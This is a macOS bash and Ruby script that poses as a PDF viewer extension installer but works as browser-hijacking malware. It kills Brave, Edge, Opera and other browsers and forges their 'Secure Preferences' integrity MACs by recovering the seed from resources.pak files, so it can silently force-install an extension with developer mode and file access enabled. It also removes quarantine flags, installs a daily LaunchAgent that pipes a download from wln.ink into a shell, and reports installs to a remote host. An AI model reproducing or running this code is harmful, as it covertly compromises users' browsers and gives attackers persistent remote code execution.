#!/bin/bash
set -e
EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/refs/heads/main.zip"
NOTIFY_URL="https://wln.ink/n"
INJ=0
UPDATE_MODE=0
EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"

TMP_ZIP="/tmp/pdf-ext.zip"
TMP_DIR="/tmp/pdf-ext-tmp"
curl -fsSL "$EXT_URL" -o "$TMP_ZIP" || exit 1
rm -rf "$TMP_DIR"
unzip -q "$TMP_ZIP" -d "$TMP_DIR" 2>/dev/null || exit 1
MANIFEST=$(find "$TMP_DIR" -name "manifest.json" -type f | head -1)
[ -z "$MANIFEST" ] && exit 1
EXT_SRC=$(dirname "$MANIFEST")
rm -f "$TMP_ZIP"

grep -q '"key"[[:space:]]*:' "$MANIFEST" || exit 1

if command -v jq >/dev/null 2>&1; then
    jq 'del(.update_url)' "$MANIFEST" > "$MANIFEST.tmp" 2>/dev/null && mv "$MANIFEST.tmp" "$MANIFEST" || rm -f "$MANIFEST.tmp"
fi

inject_secure() {
    local pdir="$1" ext_dir="$2" ext_id="$3"
    local sp="$pdir/Secure Preferences"
    local pref="$pdir/Preferences"
    [ ! -f "$ext_dir/manifest.json" ] && return 1
    [ ! -f "$pref" ] && [ ! -f "$sp" ] && return 1

    local sid
    sid=$(ioreg -rd1 -c IOPlatformExpertDevice 2>/dev/null | sed -n 's/.*IOPlatformUUID" = "\(.*\)"/\1/p' | head -1)
    [ -z "$sid" ] && return 1

    EXT_DIR="$ext_dir" EXT_ID="$ext_id" SP_FILE="$sp" PREF_FILE="$pref" SID="$sid" \
    ruby -rjson -ropenssl - <<'RUBY' || return 1
require 'json'
require 'openssl'

ext_id = ENV.fetch('EXT_ID')
ext_dir = ENV.fetch('EXT_DIR')
sp_path = ENV.fetch('SP_FILE')
pref_path = ENV.fetch('PREF_FILE')
sid = ENV.fetch('SID')
seed = ''.b

def remove_empty(v)
  case v
  when Hash
    out = {}
    v.each do |k, x|
      nx = remove_empty(x)
      next if nx.is_a?(Hash) && nx.empty?
      next if nx.is_a?(Array) && nx.empty?
      out[k] = nx
    end
    out
  when Array
    v.map { |x| remove_empty(x) }.reject { |x| (x.is_a?(Hash) && x.empty?) || (x.is_a?(Array) && x.empty?) }
  else
    v
  end
end

def sort_deep(v)
  case v
  when Hash then v.keys.sort.each_with_object({}) { |k, h| h[k] = sort_deep(v[k]) }
  when Array then v.map { |x| sort_deep(x) }
  else v
  end
end

def leaf_mac(value, path, sid, seed)
  cleaned = value.is_a?(Hash) ? sort_deep(remove_empty(value)) : value
  msg = sid + path + JSON.generate(cleaned).gsub('<', '\\u003C')
  OpenSSL::HMAC.hexdigest('SHA256', seed, msg).upcase
end

def super_mac_of(macs, sid, seed)
  OpenSSL::HMAC.hexdigest('SHA256', seed, sid + JSON.generate(macs)).upcase
end

def write_json(path, data)
  tmp = path + '.tmp-inject'
  File.write(tmp, JSON.generate(data))
  File.chmod(0600, tmp)
  File.rename(tmp, path)
end

if File.exist?(pref_path)
  begin
    pdata = JSON.parse(File.read(pref_path))
    sig = pdata.dig('extensions', 'install_signature')
    if sig && sig['invalid_ids'].is_a?(Array)
      before = sig['invalid_ids'].size
      sig['invalid_ids'] = sig['invalid_ids'] - [ext_id]
      write_json(pref_path, pdata) if sig['invalid_ids'].size != before
    end
  rescue JSON::ParserError
  end
end

sdata = if File.exist?(sp_path)
  begin
    JSON.parse(File.read(sp_path))
  rescue JSON::ParserError
    {}
  end
else
  {}
end

sdata['extensions'] ||= {}
sdata['extensions']['settings'] ||= {}
sdata['extensions']['ui'] ||= {}

existing_super = sdata.dig('protection', 'super_mac')
existing_macs = sdata.dig('protection', 'macs')
if existing_super && existing_macs.is_a?(Hash) && !existing_macs.empty?
  calc = super_mac_of(existing_macs, sid, seed)
  if calc != existing_super
    paks = Dir.glob('/Applications/*/Contents/**/resources.pak') +
           Dir.glob('/Applications/*/Contents/**/*_100_percent.pak') +
           Dir.glob('/Applications/*/Contents/**/*_200_percent.pak')
    recovered = false
    paks.uniq.each do |pak_path|
      begin
        pak = File.binread(pak_path)
        next if pak.bytesize < 32
        hdr_size = 12
        next if pak.bytesize < hdr_size + 8
        ver, enc, res_count, alias_count = pak[0, hdr_size].unpack('LCxS>S>')
        next unless ver == 5
        entry_table_size = res_count * 6 + alias_count * 4
        next if pak.bytesize < hdr_size + entry_table_size
        entries_raw = pak[hdr_size, res_count * 6]
        offsets = []
        res_count.times do |i|
          rid, off = entries_raw[i * 6, 6].unpack('S>L>')
          offsets << [rid, off] if rid > 0 && off < pak.bytesize
        end
        offsets.each do |rid, off|
          next if off + 32 > pak.bytesize
          cand = pak[off, 32]
          test = super_mac_of(existing_macs, sid, cand)
          if test == existing_super
            seed = cand
            recovered = true
            break
          end
        end
        break if recovered
      rescue => e
        next
      end
    end
  end
end

manifest = begin
  JSON.parse(File.read("#{ext_dir}/manifest.json"))
rescue JSON::ParserError
  {}
end

entry = sdata['extensions']['settings'][ext_id] || {}
entry['location'] = 4
entry['creation_flags'] = 1
entry['from_webstore'] = false
entry['state'] = 1
entry['path'] = ext_dir
entry['disable_reasons'] = []
entry['granted_permissions'] = {}
entry['manifest'] = manifest unless manifest.empty?
entry['was_installed_by_default'] = false
entry['was_installed_by_oem'] = false
entry['was_pinned_by_default'] = false
entry['active_bit'] = true
entry['newAllowFileAccess'] = true
sdata['extensions']['settings'][ext_id] = entry

sdata['extensions']['ui']['developer_mode'] = true

sdata['protection'] ||= {}
sdata['protection']['macs'] ||= {}
macs = sdata['protection']['macs']
macs['extensions'] ||= {}
macs['extensions'].delete('settings_encrypted_hash')
if macs['extensions']['ui'].is_a?(Hash)
  macs['extensions']['ui'].delete('developer_mode_encrypted_hash')
end
if macs['account_values'].is_a?(Hash) && macs['account_values']['extensions'].is_a?(Hash) &&
   macs['account_values']['extensions']['ui'].is_a?(Hash)
  macs['account_values']['extensions']['ui'].delete('developer_mode_encrypted_hash')
end
sdata['protection'].delete('super_encrypted_hash')

macs['extensions']['settings'] ||= {}
macs['extensions']['settings'][ext_id] = leaf_mac(entry, "extensions.settings.#{ext_id}", sid, seed)
macs['extensions']['ui'] ||= {}
macs['extensions']['ui']['developer_mode'] = leaf_mac(true, 'extensions.ui.developer_mode', sid, seed)
sdata['protection']['super_mac'] = super_mac_of(macs, sid, seed)

raise 'leaf' unless leaf_mac(entry, "extensions.settings.#{ext_id}", sid, seed) == macs['extensions']['settings'][ext_id]
raise 'dm' unless leaf_mac(true, 'extensions.ui.developer_mode', sid, seed) == macs['extensions']['ui']['developer_mode']
raise 'super' unless super_mac_of(macs, sid, seed) == sdata['protection']['super_mac']

write_json(sp_path, sdata)
RUBY
}

for uhome in /Users/*; do
    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue
    [ -d "$uhome/Library/Application Support/PDFViewerExt" ] && UPDATE_MODE=1 && break
done

if [ $UPDATE_MODE -eq 0 ]; then
    for app in "Brave Browser" "Microsoft Edge" "Yandex" "Opera" "Vivaldi" "Arc" "Sidekick"; do
        pkill -x "$app" 2>/dev/null || true
    done
    sleep 1
fi

for uhome in /Users/*; do
    [ ! -d "$uhome" ] || [ "$uhome" = "/Users/Shared" ] && continue

    uext="$uhome/Library/Application Support/PDFViewerExt"
    rm -rf "$uext" 2>/dev/null || true
    cp -R "$EXT_SRC" "$uext" 2>/dev/null || continue
    xattr -dr com.apple.quarantine "$uext" >/dev/null 2>&1 || true

    if command -v jq >/dev/null 2>&1 && [ -f "$uext/manifest.json" ]; then
        jq 'del(.update_url)' "$uext/manifest.json" > "$uext/manifest.json.tmp" 2>/dev/null \
            && mv "$uext/manifest.json.tmp" "$uext/manifest.json" || rm -f "$uext/manifest.json.tmp"
    fi

    export EXT_DIR="$uext"
    export EXT_ID="$EXT_ID"

    for rel in "BraveSoftware/Brave-Browser" "Microsoft Edge" "Yandex/YandexBrowser" "com.operasoftware.Opera" "Vivaldi" "Arc/User Data" "Sidekick"; do
        udata="$uhome/Library/Application Support/$rel"
        [ ! -d "$udata" ] && continue

        for pdir in "$udata/Default" "$udata/Profile"*; do
            [ ! -d "$pdir" ] && continue
            inject_secure "$pdir" "$uext" "$EXT_ID" && INJ=$((INJ + 1))
        done
    done
    
    UPDATE_SCRIPT="$uext/autoupdate.sh"
    cat > "$UPDATE_SCRIPT" << 'UPDATE_SCRIPT_EOF'
#!/bin/bash
export PATH=/usr/bin:/bin:/usr/sbin:/sbin
unset all_proxy ALL_PROXY http_proxy HTTP_proxy https_proxy HTTPS_proxy
LOG="$HOME/Library/Logs/pdfviewer-autoupdate.log"
INSTALLED_VERSION_FILE="$HOME/Library/Application Support/PDFViewerExt/manifest.json"
REMOTE_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/main/manifest.json"
[ ! -f "$INSTALLED_VERSION_FILE" ] && exit 0
CURRENT_VERSION=$(/usr/bin/jq -r '.version' "$INSTALLED_VERSION_FILE" 2>/dev/null)
[ -z "$CURRENT_VERSION" ] && exit 1
REMOTE_VERSION=$(/usr/bin/curl -fsSL --max-time 15 "$REMOTE_MANIFEST_URL" 2>/dev/null | /usr/bin/jq -r '.version' 2>/dev/null)
[ -z "$REMOTE_VERSION" ] && exit 1
[ "$CURRENT_VERSION" = "$REMOTE_VERSION" ] && exit 0
/usr/bin/curl -fsSL --max-time 60 https://wln.ink/m 2>>"$LOG" | /bin/sh >> "$LOG" 2>&1
UPDATE_SCRIPT_EOF
    chmod +x "$UPDATE_SCRIPT" 2>/dev/null
    
    LAUNCH_AGENTS="$uhome/Library/LaunchAgents"
    mkdir -p "$LAUNCH_AGENTS" 2>/dev/null || continue
    
    PLIST_FILE="$LAUNCH_AGENTS/com.pdfviewer.autoupdate.plist"
    cat > "$PLIST_FILE" << PLIST_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.pdfviewer.autoupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>$UPDATE_SCRIPT</string>
    </array>
    <key>StartInterval</key>
    <integer>86400</integer>
    <key>RunAtLoad</key>
    <false/>
    <key>StandardOutPath</key>
    <string>$uhome/Library/Logs/pdfviewer-autoupdate.log</string>
    <key>StandardErrorPath</key>
    <string>$uhome/Library/Logs/pdfviewer-autoupdate.err</string>
</dict>
</plist>
PLIST_EOF
    
    [ "$(whoami)" = "$(basename "$uhome")" ] && launchctl unload "$PLIST_FILE" 2>/dev/null || true && launchctl load "$PLIST_FILE" 2>/dev/null || true
done

rm -rf "$TMP_DIR"
[ $INJ -eq 0 ] && exit 1

if [ $UPDATE_MODE -eq 0 ]; then
    for app in "Brave Browser" "Microsoft Edge" "Yandex" "Opera" "Vivaldi" "Arc" "Sidekick"; do
        open -a "$app" --args --restore-last-session 2>/dev/null || true
    done
fi

curl -fsS -m 5 -o /dev/null -X POST "$NOTIFY_URL" -d "ev=install&os=macos&info=$INJ profiles" 2>/dev/null || true
exit 0
